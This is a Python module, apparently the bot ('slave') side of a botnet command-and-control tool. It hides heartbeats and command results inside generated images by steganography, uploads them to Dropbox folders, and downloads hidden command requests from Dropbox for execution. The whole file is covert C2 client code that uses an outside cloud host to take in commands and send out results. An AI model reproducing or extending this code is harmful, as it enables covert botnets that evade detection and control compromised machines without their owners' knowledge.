from typing import Tuple, List, Set, FrozenSet

from common.data.commands import CommandExecutionRequest, CommandExecutionResult
from common.data.heartbeat import Heartbeat
from common.dropbox_wrapper import upload_file, DropboxFolders, list_files_in_folder, download_all_files_from_folder
from common.image_generators.image_generator import generate_image
from common.steganography import insert_heartbeat_into_image, read_command_request_from_image, \
    insert_command_result_into_image
from common.utils.string_utils import generate_unique_image_name
from slave.src.data.properties import get_properties

__IMAGE_HORIZONTAL_DIMENSION = 1280
__IMAGE_VERTICAL_DIMENSION = 960


def upload_heartbeat(heartbeat: Heartbeat) -> None:
    heartbeat_image = generate_image(__IMAGE_HORIZONTAL_DIMENSION, __IMAGE_VERTICAL_DIMENSION)
    image_with_heartbeat = insert_heartbeat_into_image(heartbeat_image, heartbeat)
    heartbeat_name = generate_unique_image_name(get_properties().image_generator_mode)
    upload_file(DropboxFolders.BOT_HEARTBEATS, heartbeat_name, image_with_heartbeat)


def get_names_of_all_files_in_folder(folder_name: DropboxFolders) -> List[str]:
    files = list_files_in_folder(folder_name)
    return list(map(lambda file: file.name, files))


def download_all_viable_command_requests(resolved_files: FrozenSet[str]) -> List[Tuple[str, CommandExecutionRequest]]:
    downloaded_files = download_all_files_from_folder(DropboxFolders.COMMAND_REQUESTS, resolved_files)
    filenames_and_commands: List[Tuple[str, CommandExecutionRequest]] = []
    for downloaded_file in downloaded_files:
        command = read_command_request_from_image(downloaded_file.payload)
        filenames_and_commands.append((downloaded_file.name, command))
    return filenames_and_commands


def upload_command_result_to_dropbox(command_result: CommandExecutionResult) -> None:
    generated_image = generate_image(__IMAGE_HORIZONTAL_DIMENSION, __IMAGE_VERTICAL_DIMENSION)
    generated_name = generate_unique_image_name(get_properties().image_generator_mode)
    image_with_secret = insert_command_result_into_image(generated_image, command_result)
    upload_file(DropboxFolders.COMMAND_RESULTS, generated_name, image_with_secret)
